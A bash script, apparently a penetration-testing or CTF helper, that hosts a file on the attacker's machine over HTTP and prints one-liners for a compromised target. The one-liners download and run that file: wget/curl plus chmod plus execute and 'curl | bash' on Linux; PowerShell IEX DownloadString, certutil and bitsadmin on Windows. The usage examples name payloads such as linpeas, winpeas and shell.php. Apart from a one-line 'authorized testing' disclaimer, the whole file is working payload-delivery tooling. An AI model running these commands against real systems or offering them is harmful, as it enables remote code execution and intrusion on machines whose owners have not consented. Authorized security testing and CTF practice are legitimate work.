#!/bin/bash
# upload_and_exec.sh — Serve a file via HTTP and generate download one-liners
#
# FOR AUTHORIZED TESTING AND CTF USE ONLY
#
# USAGE:
#   ./upload_and_exec.sh -f /path/to/file
#   ./upload_and_exec.sh -f linpeas.sh -i 10.10.14.5 -p 8080

LHOST=""
LPORT="8000"
FILE=""
NO_SERVER=0

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
good() { echo -e "${GREEN}[+] $*${RESET}"; }
info() { echo -e "${CYAN}[*] $*${RESET}"; }
warn() { echo -e "${YELLOW}[-] $*${RESET}"; }
sep()  { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    echo -e "upload_and_exec.sh — Serve a file and generate target download one-liners"
    echo -e ""
    echo -e "  -f <file>    File to serve (required)"
    echo -e "  -i <ip>      Your attack box IP (auto-detected if omitted)"
    echo -e "  -p <port>    HTTP server port (default: 8000)"
    echo -e "  -n           Don't start HTTP server (just print one-liners)"
    echo -e "  -h           Help"
    echo -e ""
    echo -e "Examples:"
    echo -e "  $0 -f linpeas.sh"
    echo -e "  $0 -f winpeas.exe -i 10.10.14.5 -p 9001"
    echo -e "  $0 -f shell.php -n"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -f) FILE="$2";   shift 2 ;;
        -i) LHOST="$2";  shift 2 ;;
        -p) LPORT="$2";  shift 2 ;;
        -n) NO_SERVER=1; shift ;;
        -h|--help) usage ;;
        *) shift ;;
    esac
done

[[ -z "$FILE" ]] && { warn "File required (-f)"; usage; }
[[ -f "$FILE" ]] || { warn "File not found: $FILE"; exit 1; }

# Auto-detect attack box IP (tun0 for VPN, then eth0)
if [[ -z "$LHOST" ]]; then
    LHOST=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    if [[ -z "$LHOST" ]]; then
        LHOST=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    fi
    if [[ -z "$LHOST" ]]; then
        LHOST=$(hostname -I | awk '{print $1}')
    fi
fi

FILENAME=$(basename "$FILE")
FILESIZE=$(wc -c < "$FILE")
URL="http://${LHOST}:${LPORT}/${FILENAME}"
SERVEDIR=$(dirname "$(realpath "$FILE")")

sep
echo -e "${BOLD}  UPLOAD AND EXEC${RESET}"
sep
info "File     : $FILE ($FILESIZE bytes)"
info "Serving  : $URL"
info "Serve dir: $SERVEDIR"
sep

# ── Download one-liners ───────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}${YELLOW}Linux download one-liners:${RESET}"
echo ""
echo -e "${CYAN}# wget${RESET}"
echo "  wget $URL -O /tmp/$FILENAME && chmod +x /tmp/$FILENAME && /tmp/$FILENAME"
echo ""
echo -e "${CYAN}# curl${RESET}"
echo "  curl -fsSL $URL -o /tmp/$FILENAME && chmod +x /tmp/$FILENAME && /tmp/$FILENAME"
echo ""
echo -e "${CYAN}# curl pipe (scripts only — no disk write)${RESET}"
echo "  curl -fsSL $URL | bash"
echo ""
echo -e "${CYAN}# Python 3${RESET}"
echo "  python3 -c \"import urllib.request; urllib.request.urlretrieve('$URL', '/tmp/$FILENAME')\""
echo ""

echo -e "${BOLD}${YELLOW}Windows download one-liners:${RESET}"
echo ""
echo -e "${CYAN}# PowerShell IEX (scripts — no disk write)${RESET}"
echo "  IEX(New-Object Net.WebClient).DownloadString('$URL')"
echo ""
echo -e "${CYAN}# PowerShell download to disk${RESET}"
echo "  Invoke-WebRequest -Uri '$URL' -OutFile C:\\Windows\\Temp\\$FILENAME"
echo ""
echo -e "${CYAN}# PowerShell (older syntax)${RESET}"
echo "  (New-Object System.Net.WebClient).DownloadFile('$URL','C:\\Windows\\Temp\\$FILENAME')"
echo ""
echo -e "${CYAN}# certutil${RESET}"
echo "  certutil.exe -urlcache -split -f $URL C:\\Windows\\Temp\\$FILENAME"
echo ""
echo -e "${CYAN}# bitsadmin${RESET}"
echo "  bitsadmin /transfer job /download /priority normal $URL C:\\Windows\\Temp\\$FILENAME"
echo ""
echo -e "${CYAN}# curl (Windows 10+)${RESET}"
echo "  curl.exe -fsSL $URL -o C:\\Windows\\Temp\\$FILENAME"
echo ""

sep

# ── Start HTTP server ─────────────────────────────────────────────────────────
if [[ "$NO_SERVER" -eq 1 ]]; then
    warn "Server not started (-n). Run manually:"
    echo "  cd $SERVEDIR && python3 -m http.server $LPORT"
else
    good "Starting HTTP server on port $LPORT (serving $SERVEDIR)..."
    info "Press Ctrl+C to stop."
    echo ""
    cd "$SERVEDIR" && python3 -m http.server "$LPORT"
fi
